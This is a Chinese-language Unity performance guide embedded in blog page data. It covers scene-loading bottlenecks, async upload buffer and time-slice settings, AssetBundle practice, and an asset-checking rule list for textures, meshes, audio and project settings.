href=\"#资源加载模块的核心问题\" class=\"headerlink\" title=\"资源加载模块的核心问题\"></a>资源加载模块的核心问题</h1><hr>\n<h2 id=\"1-加载时瓶颈\"><a href=\"#1-加载时瓶颈\" class=\"headerlink\" title=\"1:加载时瓶颈?\"></a>1:加载时瓶颈?</h2><table>\n<thead>\n<tr>\n<th>引擎阶段(加载阶段)</th>\n<th>人工阶段(加载阶段)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>上一场景资源卸载</td>\n<td></td>\n</tr>\n<tr>\n<td>当前场景资源加载</td>\n<td></td>\n</tr>\n<tr>\n<td>当前场景加载后处理(GC耗时,GO销毁)</td>\n<td>当前场景中,资源加载,</td>\n</tr>\n<tr>\n<td>当前场景实例化</td>\n<td>当前场景中,AB 加载 ,实例化</td>\n</tr>\n<tr>\n<td>当前场景Active/Deactive</td>\n<td>当前场景中的 GameObject,Active/Deactive,实际初始化设置.</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>引擎函数</th>\n<th>人工函数</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>EarlyUpdate.UpdatePreloading</td>\n<td>PreLateUpdate.ScriptRunBehaviourLateUpdate</td>\n</tr>\n<tr>\n<td>Loading.UpdatePreloading</td>\n<td>LateBehaviorUpdate;  AssetBundles.Loadxxx 加载,</td>\n</tr>\n<tr>\n<td>UpdatePreloading</td>\n<td>(ToLua 第三方库) LuaLooper.LateUpdate;</td>\n</tr>\n<tr>\n<td>Application.WaitForAsyncOperationToComplete</td>\n<td></td>\n</tr>\n<tr>\n<td>Preload Sing Step(真正耗时的函数)</td>\n<td></td>\n</tr>\n<tr>\n<td>Application.LoadLevelAsync;    GarbageCollectAssetsProfile(卸载上一个场景的函数,这个函数是调用 Resources.UnloadUnusedAssets();产生的(手动或者自动触发),会有大量耗时记录)</td>\n<td></td>\n</tr>\n<tr>\n<td>;    Loading.LoadFileHeaders(Loading ReadObject,这一系列函数表示在加载新场景,读取头文件,读取GameObject),LoadAwakeFromLoad(加载后处理,mesh,shader,Shader.Parse)</td>\n<td></td>\n</tr>\n<tr>\n<td>UnityEngine.SetupCoroutine(Coroutine InvokeMoveNext)(Instantiate实例化,Active,Deactive)</td>\n<td></td>\n</tr>\n<tr>\n<td>GC.Collect;    GC.FindLiveObjects,GC.MarkDependencies;UnloadScene</td>\n<td></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"2-资源加载是否合理\"><a href=\"#2-资源加载是否合理\" class=\"headerlink\" title=\"2:资源加载是否合理?\"></a>2:资源加载是否合理?</h2><h3 id=\"纹理\"><a href=\"#纹理\" class=\"headerlink\" title=\"纹理\"></a>纹理</h3><ul>\n<li>1:Mac Size,分辨率尽量小于 1024,长宽需要是 2 的幂次方.</li>\n<li>2:Format,格式尽量选用 Unity 官方推荐的格式.</li>\n<li>3:Read/Write 尽量关闭</li>\n<li>4:Mipmap 尽量关闭</li>\n<li>5:Texture streaming</li>\n</ul>\n<h3 id=\"网格\"><a href=\"#网格\" class=\"headerlink\" title=\"网格\"></a>网格</h3><ul>\n<li>1:Model 里面的 Meshs 设置,资源的顶点数量与顶点属性数量</li>\n<li>2:Mesh Compression 尽量选 On</li>\n<li>3:Read/Write Enabled 尽量不勾选 </li>\n<li>4:Normals尽量让 Unity 自己计算</li>\n<li>5:Blend Shape Normals</li>\n<li>6:Tangents 尽量少</li>\n<li>7:Swap UVs 尽量不勾选</li>\n<li>8:Generate Lightmap UVs,尽量不勾选</li>\n<li>9:以上选择,全是为了数据量小而选择的,不为了表现,如果为了表现,需要进行取舍</li>\n</ul>\n<h3 id=\"动画片段\"><a href=\"#动画片段\" class=\"headerlink\" title=\"动画片段\"></a>动画片段</h3><ul>\n<li>1:片段数量</li>\n<li>2:压缩模式/动画精度/数据精度</li>\n<li>3:动画模式,Humanoid要比Generic 小很多</li>\n</ul>\n<h3 id=\"音频片段\"><a href=\"#音频片段\" class=\"headerlink\" title=\"音频片段\"></a>音频片段</h3><ul>\n<li>1:音频数量,</li>\n<li>2:加载方式,Load Type–&gt;选择 Streaming 是最快的</li>\n<li>3:压缩格式,Compression Format–&gt;PCM(不压缩),Vorbis(ogg 的格式),ADPCM(轻度压缩),MP3</li>\n<li>4:内存最小的选择是  :加载方式选择Streaming,压缩格式选择Vorbis,Vorbis 的 Quality 可以进一步控制,建议 50%</li>\n<li>5:建议使用 MP3 格式的音频文件,如果内存压力过大,可以考虑 Streaming 加载方式或较小 Quality 质量的 Vorbis 格式</li>\n<li>6:如果是非及时使用音效(背景音乐),建议开启 Load in Background 来提升加载效率</li>\n<li>7:如果 存在大量频繁使用的音效,建议选择 Decompressed On Load 来降低 CPU 开销</li>\n</ul>\n<h3 id=\"Particle-System\"><a href=\"#Particle-System\" class=\"headerlink\" title=\"Particle System\"></a>Particle System</h3><ul>\n<li>1:粒子系统数量</li>\n<li>2:材质,很多粒子加载,会将相同Material 加载进内存.</li>\n</ul>\n<h3 id=\"资源加载卸载的-API\"><a href=\"#资源加载卸载的-API\" class=\"headerlink\" title=\"资源加载卸载的 API\"></a>资源加载卸载的 API</h3><ul>\n<li>1:Resources.Load</li>\n<li>2:Resources.LoadAsync</li>\n<li>3:AssetBundle.Load</li>\n<li>4:AssetBundle.LoadAsync</li>\n<li>5:异步加载时开启Application.backgroundLoadingPriority=ThreadPriority.High;表示异步操作可以在主线程的单帧花费最长时间。单帧花费时间越多，可加载的数据越多，因此帧率将有所下降，较为影响游戏性能，但可减少加载资源的时间，能更快的进入游戏！反之，单帧花费时间越少，可加载的数据越少，对游戏的游戏性能影响较小，可在游戏进行时有很好的后台加载。<a href=\"https://docs.unity3d.com/2017.1/Documentation/ScriptReference/Application-backgroundLoadingPriority.html\" target=\"_blank\" rel=\"noopener\">官方文档</a></li>\n<li>6:QualitySettings.asyncUploadTimeSlice = 2;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。使用asyncUploadTimeSlice以毫秒为单位设置异步纹理上传的时间片框架。最小值为1，最大值为33。</li>\n<li>7:QualitySettings.asyncUploadBufferSize = 4;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。设置异步纹理上传的缓冲区大小。大小的单位是兆字节。最小值为2，最大值为512。虽然缓冲区会自动调整大小以适应当前加载的最大纹理，但建议将该值设置为场景中使用的最大纹理的大小，以避免重新调整缓冲区的大小会导致性能损失。</li>\n</ul>\n<h2 id=\"3-引擎如何加载一个-Prefab\"><a href=\"#3-引擎如何加载一个-Prefab\" class=\"headerlink\" title=\"3:引擎如何加载一个 Prefab?\"></a>3:引擎如何加载一个 Prefab?</h2><p>为何我们调整了 资源加载卸载的API 中提到的三个参数,异步加载就变得快了.我们就要了解引擎是如何加载一个 prefab 的.一个 UI 的 Prefab 可能含有 Texture,Mesh,Material 等等很多东西.</p>\n<ul>\n<li>1:加载 Mesh 并传输到 GPU;异步串行;异步串行加载时会寻找 AssetBundle 里面含有哪些资源,然后反序列化这些资源,然后先加载这个 Prefab 的 Mesh 传到 GPU 里面;</li>\n<li>2:加载 Texture 并传输到 GPU;异步串行;</li>\n<li>3:加载 shader &amp; Material;异步串行;前期是加载 shader,后期是主线程解析 shader</li>\n<li>4:加载 Object &amp; Component;异步串行;</li>\n<li>5:加载 AnimationClip 资源;异步串行;完全可以放在异步里面进行加载,不会卡主线程</li>\n<li>6:加载 Audio 资源;异步串行;使用 Streaming 模式是最快的.</li>\n<li>7:大量资源的异步加载均可在子线程中进行</li>\n<li>8:主线程主要处理 AwakeFromLoad &amp; Shader 解析</li>\n<li>9:主线程可以留出大量空间供逻辑代码使用</li>\n</ul>\n<hr>\n<h2 id=\"4-如何优化加载\"><a href=\"#4-如何优化加载\" class=\"headerlink\" title=\"4:如何优化加载?\"></a>4:如何优化加载?</h2><ul>\n<li>1:加快 Mesh,Texture等资源的异步加载效率</li>\n<li>2:加快处理 AwakeFromLoad &amp; Shader 解析</li>\n<li>3:Async Upload Pipeline<blockquote>\n<ul>\n<li>A:加载线程异步加载 Texture 和 Mesh 资源,用了 Mesh 的压缩,需要在主线程进行解压,是不能进行异步加载的,地形的 Texture 开了 Read/Write 是不能进行异步加载的</li>\n<li>B:通过渲染线程直接将其传送到 GPU</li>\n<li>C:目前 Unity 都支持,</li>\n<li>D:代码里面异步加载方法 AsyncUploadBuffer 加载完毕之后,直接回放到渲染线程进行渲染,渲染线程中的渲染方法AsyncUploadTimeSlice将数据上传</li>\n</ul>\n</blockquote>\n</li>\n<li>4:优化方法:将QualitySettings.asyncUploadBufferSize = 4;改为QualitySettings.asyncUploadBufferSize = 16;表示引擎从硬盘里面每次读取 4M,变为读取 16M,读取时都是在子线程.这个参数里面的 buff 缓冲可以认为是流式的读取</li>\n<li>5:优化方法:QualitySettings.asyncUploadTimeSlice = 2;改为QualitySettings.asyncUploadBufferSize = 8;表示渲染线程每一帧使用 2ms 去干活,变为渲染线程每一帧使用  8ms 去干活,有可能就多开了一个渲染线程</li>\n<li>6:AUP 让内存占用更加可控,加载 Upload Buffer 会增加一个恒定的内存,除此之外几乎没有副作用,在内存允许的情况下,可以设置 16MB 或者 32MB.对于asyncUploadTimeSlice方法,如果设置过大,会产生卡顿现象.</li>\n<li>7:压缩主线程上面的资源,控制异步加载资源在主线程的”后加载”耗时,各种资源的 AwakeFromLoad,Shader.Parse,设置代码 Application.backgroundLoadingPriority=ThreadPriority.High;</li>\n<li>8:Texture.AwakeFromLoad 是从主线程里面将Texture传到 GPU</li>\n<li>9:优化异步加载:调整 Upload Buffer 和 Upload Time Slice,调整 BackLoadingPriority,开启多线程渲染,调整资源的加载顺序(比如 shader)</li>\n<li>10:异步加载时需要注意代码的写法,不要搞成一帧加载很多.AssetBundle 加载的写法需要注意</li>\n<li>11:需要查看实例化操作是否合理,实例化的频率,大概需要 10K 帧有大的浮动;  一般正常的加载方式是–&gt;AB a0–&gt;AB a1(依赖 a0)–&gt;加载 a1–&gt;instantiate a1;错误加载方式–&gt;AB a1(依赖 a0)–&gt;加载 a1–&gt;instantiate a1–&gt;AB a0 这种情况下 a0 资源会出现在其他错误的地方;</li>\n<li>12:需要查看Active/Deactive操作是否合理,尤其是在 NGUI/UGUI 上面</li>\n</ul>\n<hr>\n<h2 id=\"5-资源内存\"><a href=\"#5-资源内存\" class=\"headerlink\" title=\"5:资源内存\"></a>5:资源内存</h2><ul>\n<li>1:有很多纹理在内存里面,但是没有进行渲染,也就是没有用到.需要查看 UI图集,技能特效.</li>\n<li>2:注意纹理的分辨率大小,以及 Mipmap 是否物尽其用</li>\n<li>3:在品质设置里面有个 Texture Streaming 选项中,有个参数:Memory Budget,在其足够时,Scene Texture 是满 Mipmap 加载,动态加载的 GO Texture 是最比配的 mipmap 进行加载和实例化,渲染时,则按照距离原因和 budget 进行调整.再其不足时,Scene Texture按照最低配加载,已加载 Streamed Texture 按照距离 Remove Mipmap,越远的越先 Remove 高 Level Mipmap ,动态加载的 GO Texture 只按最低配 Mipmap 加载,实例化和渲染.</li>\n<li>4:Max Level Reduction设定为 1 表示加载 mipmap 第一级,设置为 2 加载第二级</li>\n<li>5:在 mobile 端一定要设置 QualitySettings.streamingMipmapsActive = true;</li>\n<li>6:网格:关注顶点渲染密度.</li>\n<li>7:音频片段,Streaming 加载方式比较适合于背景音乐,对于同时播放的小音频文件,建议通过 Decompressed 方式.</li>\n</ul>\n<hr>\n<h2 id=\"6-AB-包\"><a href=\"#6-AB-包\" class=\"headerlink\" title=\"6:AB 包\"></a>6:AB 包</h2><ul>\n<li>1:建议目前全部采用 LZ4 压缩</li>\n<li>2:本地加载,建议使用 LoadFromFile(Async)来加载</li>\n<li>3:根据机型,选择适合的 Coroutine 次数</li>\n<li>4:如果自己压缩,建议使用 Gzip+LoadFromFile(Async)来加载</li>\n<li>5:AssetBundle.LoadAll 比 Asset.Load OneByOne 要好很多.</li>\n<li>6:切换场景时,尽可能使用 AssetBundle.Load 来提升加载效率</li>\n<li>7:小,细碎的同种类资源打包在一起(Shader,ParticleSystem)</li>\n</ul>\n<hr>\n<h2 id=\"7-Mono堆内存\"><a href=\"#7-Mono堆内存\" class=\"headerlink\" title=\"7:Mono堆内存\"></a>7:Mono堆内存</h2><ul>\n<li>1:子线程 Mono 分配,多见于和服务器交互.</li>\n<li>2:Lua 内存检测,关注 Destroyed 总数.</li>\n<li>3:Instantiate 实例化频率,实例化的耗时.</li>\n<li>4:Active/Deactive 频率和耗时.复杂的界面/带有动画组件的 GameObject 不要频繁使用</li>\n</ul>\n<h1 id=\"资源规范\"><a href=\"#资源规范\" class=\"headerlink\" title=\"资源规范\"></a>资源规范</h1><ul>\n<li><p>1 Animation </p>\n<pre><code>检查动画曲线精度:动画曲线精度过高会增加动画占用内存; 此规则仅面向以文本格式序列化的*.anim文件中的浮点精度;用文本编辑器打开.anim动画文件，修改m_EditorCurves::curve::m_Curve下的float值的精度。建议用脚本直接将此文件中所有float精度都调整为5位小数以下。动画曲线精度应小于5 ;       \n检查动画缩放曲线:动画不应具有缩放曲线,动画中的缩放曲线会增加动画占用内存,用文本编辑器打开.anim动画文件，确认m_EditorCurves和m_FloatCurves下不包括attribute为m_Scale的curve子对象。动画不应具有缩放曲线;</code></pre></li>\n<li><p>2 AnimationController </p>\n<pre><code>动画控制器中的动画剪辑个数: 动画控制器中动画剪辑数量过多会造成动画初始化耗时过多;动画剪辑个数应小于2</code></pre></li>\n<li><p>3 FBX     </p>\n<pre><code>检查读/写标志:开启FBX资源的读/写标志会导致双倍的内存占用;FBX资源的读/写标志应该被禁用      \n检查动画资源压缩方式:动画资源使用最佳压缩方式可以提高加载效率;查看Inspector -&gt; Animation Tab -&gt; Anim. Compression选项;动画资源应该使用最佳压缩方式      \n应为网格资源启用OptimizeMesh;为网格资源启用OptimizeMesh可以减少最终游戏包的大小;检查网格资源的OptimizeMesh;查看Inspector -&gt; Model Tab -&gt; Meshes -&gt; Optimize mesh选项;应为网格资源启用OptimizeMesh;        \n在FBX资源中有太多的顶点, 默认阈值是500;FBX资源资源中有太多的顶点, 请检查是否必要;检查FBX资源定点数;顶点数量限制;FBX资源资源中有太多的顶点;顶点数量有多少;             </code></pre></li>\n<li><p>4 Prefab</p>\n<pre><code>Prefab Max Particle Limit;渲染Mesh的粒子系统不宜设置过高的粒子总数, 默认阈值为30;当粒子系统渲染Mesh时(Inspector: Particle System -&gt; Renderer -&gt; Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子总数加以限制;检查最高粒子总数限制;检查Inspector -&gt; Particle System -&gt; Max Particles配置;渲染Mesh的粒子系统不宜设置过高的粒子总数;              \n检查粒子系统的发射速率:当粒子系统渲染Mesh时(Inspector: Particle System -&gt; Renderer -&gt; Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子发射速率加以限制;检查Inspector -&gt; Particle System -&gt; Emission -&gt; Rate over Time/Distance配置;渲染Mesh的粒子系统不宜设置过高的粒子发射速率, 不应超过5             \n检查Skinned Mesh Renderer:启用Skinned Motion Vectors会使渲染器同时使用当前帧和上一帧的蒙皮网络来渲染目标的动画以提高精度，从而需要双倍大小的缓冲区并占用双倍的显存;启用Skinned Motion Vectors将以消耗双倍内存为代价提高蒙皮网格的精度;      \n检查网格读/写标记:被预制件关联的网格资源应该关闭读/写标记;被预制件关联的网格资源应该关闭读/写标记       </code></pre></li>\n<li><p>5 Scene</p>\n<pre><code>检查场景未添加tag的GameObject:场景中的所有GameObject都应当添加tag;场景包含未添加tag的GameObject;          \nScene Multiple Audio Listeners:一个场景不应包含多个Audio Listener;一个场景不应包含多个Audio Listener;检查场景中的Audio Listener;检查场景中所有GameObject下的Audio Listener组件;场景包含多个音频侦听器;                    \n检查场景中mesh collider:Mesh Collider可以在场景中提供更精细化的碰撞检测，随之而来也会消耗大量计算资源，建议审慎使用。 检查场景中所有GameObject下的Mesh Collider组件;场景包含了mesh collider;        \n检查场景渲染设置:在移动平台，建议在渲染设置中关闭对雾的渲染以节省计算资源。检查Window -&gt; Rendering -&gt; Lighting Settings -&gt; Scene -&gt; Other Settings -&gt; Fog选项;在移动平台，应在设置里关闭雾的渲染;           \nScene Shadow Resolution;场景中灯光的阴影分辨率应与项目设置一致;场景中灯光的阴影分辨率应与项目设置一致;检查场景阴影分辨率;检查Inspector -&gt; Light -&gt; Shadow Type -&gt; Realtime Shadows -&gt; Resolution选项，建议使用&#39;Use Quality Settings&#39;;场景中灯光的阴影分辨率应与项目设置一致;            \nScene Rigidbody;场景中的静态GameObject不应关联Rigidbody;静态GameObject的Rigidbody模块是无用的;检查场景中的Rigidbody;静态GameObject不应关联Rigidbody;        \nScene Canvas Component;包含太多组件的Canvas可能会影响UI刷新的性能;包含太多组件的Canvas可能会影响UI刷新的性能，并进一步影响应用的帧率;检查Canvas中的component数量;包含太多组件的Canvas可能会影响UI刷新的性能;            \nScene UI Outside Screen;场景包含屏幕外的UI组件;放置在屏幕外的UI组件尽管不可见仍会消耗渲染资源，建议删掉此组件或者修正可能出现的设置错误;检查屏幕外的UI组件;场景包含屏幕外的UI组件;            \n检查场景Animator组件中的ApplyRootMotion选项:如果不需要进行根骨骼动画位移, 建议关闭场景中Animator组件的applyRootMotion选项。场景中包含勾选了applyRootMotion选项的Animator组件;       \n检查场景Animator组件中的cullingMode:场景中Animator组件的cullingMode是AlwaysAnimate会增加CPU使用率。场景中包含cullingMode为AlwaysAnimate的Animator组件;</code></pre></li>\n<li><p>6 Script</p>\n<pre><code>检查OnGUI方法:由于内存使用率高，不应使用OnGUI方法;IMGUI是过时的UI系统，仅建议在开发调试时使用。     \n检查所有的 Mono 生命周期函数 方法:空方法会导致掉帧,建议去除。     </code></pre></li>\n<li><p>7 Shader</p>\n<pre><code>检查Shader中纹理数量:Shader中过多的纹理可能会增加GPU消耗;Shader中的纹理个数应小于3,Shader Texture Count</code></pre></li>\n<li><p>8 Texture</p>\n<pre><code>检查纹理读/写标记:开启纹理资源的读/写标志会导致双倍的内存占用; 检查Inspector -&gt; Advanced -&gt; Read/Write Enabled选项;纹理资源的读/写标志应被禁用;         \n检查Mipmap标记:未压缩的纹理资源启用Mipmap标志会增加内存占用; 检查Inspector -&gt; Advanced -&gt; Generate Mip Maps选项;未压缩的纹理应该禁用mipmap ;        \nTexture iOS compression format;检查iOS平台的纹理压缩格式;检查iOS平台的纹理压缩格式;iOS平台纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -&gt; Default -&gt; Format选项; 如果希望为iOS平台单独设置，打开旁边的iOS选项卡，勾选Override for iOS并检查下面的Format选项;iOS平台的纹理格式应该是astc;对iOS平台使用默认值，但格式不是Automatic;         \nAndroid平台纹理压缩格式:检查Android平台的纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -&gt; Default -&gt; Format选项; 如果希望为Android平台单独设置，打开旁边的Android选项卡，勾选Override for Android并检查下面的Format选项;对安卓平台使用默认值，但格式不是Automatic;           \n纹理资源大小2的幂次:大小非2的幂次的纹理资源将无法使用ETC1和PVRTC压缩格式。在导入时自动伸缩为2的幂次也可能会导致内存占用或者贴图质量问题。 检查Inspector -&gt; Advanced -&gt; Non-Power of 2选项. 建议使用原始大小为2的幂次的贴图;纹理大小不是2的幂次;         \n检查纹理是否过大:过大的纹理资源会更多的消耗内存;Custom Parameters: heightThreshold : 512widthThreshold : 512;纹理大于 512 * 512 ;       \n检查Aniso级别:检查Inspector -&gt; Aniso Level滑动条;纹理资源的Aniso级别大于1;Aniso级别大于1的纹理资源会增加内存占用和采样率;纹理资源的Aniso级别不应大于1;                \n检查纹理资源的过滤模式:纹理的过滤模式一般不建议使用Trilinear，会占用较高的计算资源。 检查Inspector -&gt; Filter Mode选项;纹理使用了Trilinear过滤模式;          \n检查纹理资源alpha通道:如果纹理包含空的alpha通道，则应禁用&#39;Alpha源&#39;标志，否则会浪费这部分的内存。 检查Inspector -&gt; Alpha Source选项;应禁用具有空Alpha通道的纹理的‘Alpha源’标志;          \n检查纯色纹理:纯色纹理的使用可能可以由一些设置来代替。由于某些情况下纯色纹理是必不可少的，此警告仅会在所使用的纹理较大(&gt;16*16)时才会触发。纯色纹理会浪费内存;        \nTexture edge transparent;边缘有较大透明部分的纹理应裁剪以节省内存;边缘有较大透明部分的纹理应裁剪以节省内存;检查纹理透明边缘;边缘有较大透明部分的纹理应裁剪以节省内存;           \n检查纹理重复环绕模式:Repeat Wrap模式可能会导致纹理上出现意外的边缘; 检查Inspector -&gt; Wrap Mode选项;重复环绕模式可能会导致纹理上出现意外的边缘;     \n检查重复纹理:检查重复纹理;纹理重复          \n检查雪碧图纹理填充率:填充率是雪碧图分割后的有效面积与总面积的比率，较低的雪碧图纹理填充率会导致显存的浪费。Custom Parameters: fillRateThreshold : 0.5onlyCheckSprite : True; 尝试重新编排雪碧图，尽量缩小总面积以提高填充率;sprite填充率低于 0.5</code></pre></li>\n<li><p>9 Audio</p>\n<pre><code>启用Force to Mono:检查Inspector -&gt; Force To Mono选项:应为音频资源启用forceMono,如不需要立体声,开启forceMono可以减少内存和磁盘占用;音频应该启用forceMono，以节省存储和内存;      \n检查iOS平台的音频压缩格式:检查Inspector -&gt; iOS Tab -&gt; Compression Format选项;iOS平台的音频剪辑应使用MP3格式;        \n检查安卓平台的音频压缩格式:检查Inspector -&gt; Android Tab -&gt; Compression Format选项;安卓平台的音频剪辑应使用Vorbis格式;       \n检查音频加载类型:检查Inspector -&gt; (Platform Tab) -&gt; Load Type选项;有多少的短音效应使用DecompressOnLoad;有多少的的常规音效应使用CompressedInMemory;有多少的音乐应该使用Streaming;        </code></pre></li>\n<li><p>10 EditorSetting<br>应设置CompanyName;检查公司名称设置;检查File -&gt; Build Settings -&gt; Player Settings -&gt; Player -&gt; Company Name的设置;CompanyName不应设置为DefaultCompany;<br>应设置Build Target Icons;应设置Build Target Icons;检查Build Target图标;检查File -&gt; Build Settings -&gt; Player Settings -&gt; Player -&gt; Default Icon的设置;应设置 %s 的Build Target Icons;<br>应设置开启GraphicsJobs;这项设置会为图形任务开启多线程. 但这个是实验性质的, 会引起新的问题. 请自行测试;检查GraphicsJobs设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Graphic Jobs(Experimental)*的设置;尝试开启graphicJobs并测试;<br>应设置开启BakeCollisionMeshes;这项设置可以减少加载/初始化的时间, 虽然会增加一些构建时间和包体积;检查BakeCollisionMeshes设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; PreBake Collision Meshes的设置;如果在项目中启用了physics, 可以考虑开启Prebake Collision Meshes选项;<br>应设置开启StripEngineCode;关闭StripEngineCode会增加包体积;检查StripEngineCode设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Strip Engine Code的设置;关闭StripEngineCode会增加包体积;<br>在Physics设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics中的AutoSyncTransforms设置:检查Editor -&gt; Project Settings -&gt; Physics -&gt; Auto Sync Transforms的设置;在Physics设置中开启AutoSyncTransforms会增加CPU的使用;<br>在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics设置中的LayerCollisionMatrix设置;检查Editor -&gt; Project Settings -&gt; Physics -&gt; Layer Collision Matrix的设置;在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;<br>在Physics2D设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics2D中的AutoSyncTransforms设置;检查Editor -&gt; Project Settings -&gt; Physics2D -&gt; Auto Sync Transforms的设置;在Physics2D设置中开启AutoSyncTransforms会增加CPU的使用;<br>在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics2D中LayerCollisionMatrix设置;检查Editor -&gt; Project Settings -&gt; Physics2D -&gt; Layer Collision Matrix的设置:在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;<br>StandardShaderQuality选项在所有Graphics Tier中应相同:这会增加编译时间和包体积, 除非你想要支持很多性能跨度很大的设备;检查Graphics中StandardShaderQuality设置;检查Editor -&gt; Project Settings -&gt; Graphics -&gt; Tiers -&gt; Standard Shader Quality的设置;StandardShaderQuality选项在所有Graphics Tier中应相同;<br>Android设置中的ManagedStrippingLevel选项不应为Low或者Disabled:这会增加包体积;检查Android的ManagedStrippingLevel设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Managed Stripping Level的设置;ndroid设置中的ManagedStrippingLevel选项应为Medium或者High;<br>iOS设置中的Architecture选项不应为Universal;这会增加包体积. 如果工程并不准备支持32位的 iOS 设备, 将其设为 ARM64;检查iOS的Architecture设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Architecture的设置;iOS设置中的Architecture选项不应为Universal;<br>iOS设置中的AccelerometerFrequency选项应为 Disabled;如果项目没有用到设备的加速度计, 禁用 AccelerometerFrequency 可以节省一些 CPU 处理时间;检查iOS的AccelerometerFrequency设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Accelerometer Frequency的设置;iOS设置中的AccelerometerFrequency选项应为 Disabled;<br>在 iOS 的 GraphicsAPIs 设置里应只包含 Metal:如果设备支持Metal, 在 GraphicsAPIs 里只开启 Metal 可以减少包体积和得到更好的 CPU 表现;检查iOS的GraphicsAPIs设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; GraphicsAPIs的设置;在 iOS 的 GraphicsAPIs 设置里应只包含 Metal;<br>“Editor iOSManagedStrippingLevel Setting”:iOS设置中的ManagedStrippingLevel选项不应为Low;这会增加包体积;检查iOS的ManagedStrippingLevel设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Managed Stripping Level的设置;iOS设置中的ManagedStrippingLevel选项应为Medium或者High;<br>不建议使用Resources系统来管理asset;使用Resources系统可能会延长程序的启动时间。此系统已经过时，不建议使用。检查项目目录下是否存在Resources文件夹;不建议使用Resources系统来管理asset;     </p>\n<pre><code></code></pre></li>\n</ul>\n<p>11 Mesh</p>\n<pre><code>Mesh Read&amp;Write Flag:应为网格资源禁用读/写标志;开启Mesh资源的读/写标志会导致双倍的内存占用;检查网格资源读/写标记;网格资源应禁用读/写标志;       </code></pre><p>12 Model</p>\n<pre><code>Model Read&amp;Write Flag;应为模型资源禁用读/写标志;开启M资源的读/写标志会导致双倍的内存占用;检查模型资源读/写标记;模型资源应禁用读/写标志;     </code></pre><p>13 Video</p>\n<pre><code>导入的视频文件大小应小于某一限制，默认为256MB;检查视频大小;导入的视频文件体积不应过大;视频大小限制;;      </code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"资源加载模块的核心问题\"><a href=\"#资源加载模块的核心问题\" class=\"headerlink\" title=\"资源加载模块的核心问题\"></a>资源加载模块的核心问题</h1><hr>\n<h2 id=\"1-加载时瓶颈\"><a href=\"#1-加载时瓶颈\" class=\"headerlink\" title=\"1:加载时瓶颈?\"></a>1:加载时瓶颈?</h2><table>\n<thead>\n<tr>\n<th>引擎阶段(加载阶段)</th>\n<th>人工阶段(加载阶段)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>上一场景资源卸载</td>\n<td></td>\n</tr>\n<tr>\n<td>当前场景资源加载</td>\n<td></td>\n</tr>\n<tr>\n<td>当前场景加载后处理(GC耗时,GO销毁)</td>\n<td>当前场景中,资源加载,</td>\n</tr>\n<tr>\n<td>当前场景实例化</td>\n<td>当前场景中,AB 加载 ,实例化</td>\n</tr>\n<tr>\n<td>当前场景Active/Deactive</td>\n<td>当前场景中的 GameObject,Active/Deactive,实际初始化设置.</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>引擎函数</th>\n<th>人工函数</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>EarlyUpdate.UpdatePreloading</td>\n<td>PreLateUpdate.ScriptRunBehaviourLateUpdate</td>\n</tr>\n<tr>\n<td>Loading.UpdatePreloading</td>\n<td>LateBehaviorUpdate;  AssetBundles.Loadxxx 加载,</td>\n</tr>\n<tr>\n<td>UpdatePreloading</td>\n<td>(ToLua 第三方库) LuaLooper.LateUpdate;</td>\n</tr>\n<tr>\n<td>Application.WaitForAsyncOperationToComplete</td>\n<td></td>\n</tr>\n<tr>\n<td>Preload Sing Step(真正耗时的函数)</td>\n<td></td>\n</tr>\n<tr>\n<td>Application.LoadLevelAsync;    GarbageCollectAssetsProfile(卸载上一个场景的函数,这个函数是调用 Resources.UnloadUnusedAssets();产生的(手动或者自动触发),会有大量耗时记录)</td>\n<td></td>\n</tr>\n<tr>\n<td>;    Loading.LoadFileHeaders(Loading ReadObject,这一系列函数表示在加载新场景,读取头文件,读取GameObject),LoadAwakeFromLoad(加载后处理,mesh,shader,Shader.Parse)</td>\n<td></td>\n</tr>\n<tr>\n<td>UnityEngine.SetupCoroutine(Coroutine InvokeMoveNext)(Instantiate实例化,Active,Deactive)</td>\n<td></td>\n</tr>\n<tr>\n<td>GC.Collect;    GC.FindLiveObjects,GC.MarkDependencies;UnloadScene</td>\n<td></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"2-资源加载是否合理\"><a href=\"#2-资源加载是否合理\" class=\"headerlink\" title=\"2:资源加载是否合理?\"></a>2:资源加载是否合理?</h2><h3 id=\"纹理\"><a href=\"#纹理\" class=\"headerlink\" title=\"纹理\"></a>纹理</h3><ul>\n<li>1:Mac Size,分辨率尽量小于 1024,长宽需要是 2 的幂次方.</li>\n<li>2:Format,格式尽量选用 Unity 官方推荐的格式.</li>\n<li>3:Read/Write 尽量关闭</li>\n<li>4:Mipmap 